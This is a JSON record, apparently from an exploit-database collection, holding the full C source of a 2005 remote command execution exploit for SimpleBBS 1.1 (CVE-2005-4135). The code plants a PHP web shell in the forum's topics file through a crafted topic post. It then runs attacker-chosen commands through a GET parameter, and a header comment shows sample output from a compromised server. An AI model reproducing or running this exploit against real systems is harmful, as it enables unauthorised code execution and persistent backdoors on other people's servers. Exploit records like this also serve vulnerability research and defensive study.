{
  "id": "1361",
  "title": "SimpleBBS 1.1 - Remote Command Execution",
  "cve": "CVE-2005-4135",
  "vuln_type": "unknown",
  "code": "/*\r\n\r\nSimpleBBS <= v1.1 remote commands execution in c\r\n\r\ncoded by: unitedasia v.Dec.7.2005\r\n\r\ngreetz: iloveyouma\r\n\r\nhttp://geography.about.com/library/maps/blrasia.htm\r\nhttp://www.lib.utexas.edu/maps/middle_east_and_asia/asia_pol00.jpg\r\n\r\n$ gcc -o bbs bbs.c\r\n\r\nUsage ./bbs [host] [/folder/] [cmd]\r\n\r\n$ ./bbs www.somesite.com /simplebbs/ 'ls%20-al;w;id;pwd'\r\n\r\nHTTP/1.1 200 OK\r\nDate: Wed, 07 Dec 2005 15:31:07 GMT\r\nServer: Apache/1.3.34 (Unix) mod_auth_passthrough/1.8 mod_log_bytes/1.2 mod_bwlimited/1.4 PHP/4.4.0 FrontPage/5.0.2.2635 mod_ssl/2.8.25 OpenSSL/0.9.6b\r\nX-Powered-By: PHP/4.4.0\r\nConnection: close\r\nContent-Type: text/html\r\n\r\n161||||||1|||Winning||||||0|||Willy\\\\\\\"><!--total 188\r\ndrwxrwxrwx    2 f1       f1           4096 Dec  6 17:02 .\r\ndrwxr-xr-x    7 f1       f1           4096 Nov 17  2002 ..\r\n-rw-r--r--    1 f1       f1            916 Oct 20 09:30 WS_FTP.LOG\r\n-rwxrwxrwx    1 f1       f1             28 Nov 17  2002 categories.php\r\n-rwxrwxrwx    1 f1       f1            151 Dec  7 09:11 forums.php\r\n-rwxrwxrwx    1 f1       f1              0 Nov 17  2002 index.php\r\n-rwxrwxrwx    1 f1       f1              0 Nov 17  2002 online.php\r\n-rwxrwxrwx    1 f1       f1            550 Nov 17  2002 options.php\r\n-rwxrwxrwx    1 f1       f1          28098 Dec  7 10:31 posts.php\r\n-rwxrwxrwx    1 f1       f1            151 Dec  7 09:11 temp.php\r\n-rw-r--r--    1 nobody   nobody      87569 Dec  6 17:03 tmp.php\r\n-rwxrwxrwx    1 f1       f1          38089 Dec  7 10:31 topics.php\r\n 10:31am  up 195 days, 11:35,  1 user,  load average: 0.27, 0.23, 0.16\r\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT\r\nroot     pts/1    watcher.somesite.com 11Nov05 11:52m 16:51   0.41s  -bash\r\nuid=99(nobody) gid=99(nobody) groups=99(nobody)\r\n/home/f1/public_html/simplebbs/data\r\n\r\n\r\n*/\r\n\r\n\r\n#include <stdio.h>\r\n#include <string.h> /* inserted /str0ke */\r\n#include <stdlib.h> /* inserted /str0ke */\r\n#include <errno.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n#include <netdb.h>\r\n#define closesocket(s) close(s)\r\n\r\n#define HTTP_PORT 80\r\n\r\n#define DATA \"name=Willy\\\\\\\"><!--<?php error_reporting(0);print `\\\\$_GET[cmd]`; die;?>&subject=Winning&message=i would like to know how each team finds the perfect aerodinamic confuguration for each circuit, i mean, how they come to the conclusion of how the wings configurated.&sendTopic=Send\"\r\n\r\n\r\n/****************** MAIN *********************/\r\n\r\nvoid sendpacket(char buffer[8192], int p, char host[100]);\r\n\r\n\r\nint main( int argc, char **argv)\r\n{\r\n\r\n    char buffer[8192];\r\n    char dat[8192];\r\n    int count;\r\n\r\n    if(argc<4)\r\n    {\r\n         printf(\"Usage %s [host] [/folder/] [cmd]\\n\\nSimpleBBS <= v1.1 remote commands execution in c\\ncoded by: unitedasia v.Dec.7.2005\\ngreetz: iloveyouma\\n\",argv[0]);\r\n         exit(1);\r\n    }\r\n\r\n    sprintf(dat, DATA);\r\n\r\n    sprintf( buffer, \"POST %sindex.php?v=newtopic&c=0 HTTP/1.0\\nHost: %s\\nContent-Type: application/x-www-form-urlencoded\\nContent-Length: %d\\n\\n%s\\n\\n\\n\", argv[2], argv[1], strlen(dat), dat);\r\n\r\n    sendpacket(buffer,0,argv[1]);\r\n\r\n    sprintf( buffer, \"GET %sdata/topics.php?cmd=%s HTTP/1.0\\nHost: %s\\n\\n\", argv[2], argv[3], argv[1]);\r\n\r\n    sendpacket(buffer,1,argv[1]);\r\n\r\n    return count;\r\n}\r\n\r\nvoid sendpacket(char buffer[8192], int p, char host[100])\r\n{\r\n\r\n    struct sockaddr_in server;\r\n    struct hostent *host_info;\r\n    unsigned long addr;\r\n    int sock;\r\n    char dat[8192];\r\n    int count;\r\n\r\n    /* create socket */\r\n    sock = socket( PF_INET, SOCK_STREAM, 0);\r\n    if (sock < 0) {\r\n        perror( \"failed to create socket\");\r\n        exit(1);\r\n    }\r\n\r\n    /* Create socketadress of Server\r\n     * it is type, IP-adress and portnumber */\r\n    memset( &server, 0, sizeof (server));\r\n\r\n    /* convert the Servername to a IP-Adress */\r\n    host_info = gethostbyname( host);\r\n    if (NULL == host_info) {\r\n        fprintf( stderr, \"unknown server: %s\\n\", host);\r\n        exit(1);\r\n    }\r\n    memcpy( (char *)&server.sin_addr, host_info->h_addr, host_info->h_length);\r\n\r\n    server.sin_family = AF_INET;\r\n    server.sin_port = htons( HTTP_PORT);\r\n\r\n\r\n    /* connect to the server */\r\n    if ( connect( sock, (struct sockaddr*)&server, sizeof( server)) < 0) {\r\n        perror( \"can't connect to server\");\r\n        exit(1);\r\n    }\r\n\r\n    send( sock, buffer, strlen( buffer), 0);\r\n\r\n    /* get the answer from server and put it out to stdout */\r\n    if (p==1) {\r\n      do {\r\n          count = recv( sock, buffer, sizeof(buffer), 0);\r\n          write( 1, buffer, count);\r\n      }\r\n      while (count > 0);\r\n    }\r\n\r\n    /* close the connection to the server */\r\n    closesocket( sock);\r\n\r\n}\r\n\r\n// milw0rm.com [2005-12-07]",
  "url": "https://www.exploit-db.com/exploits/1361"
}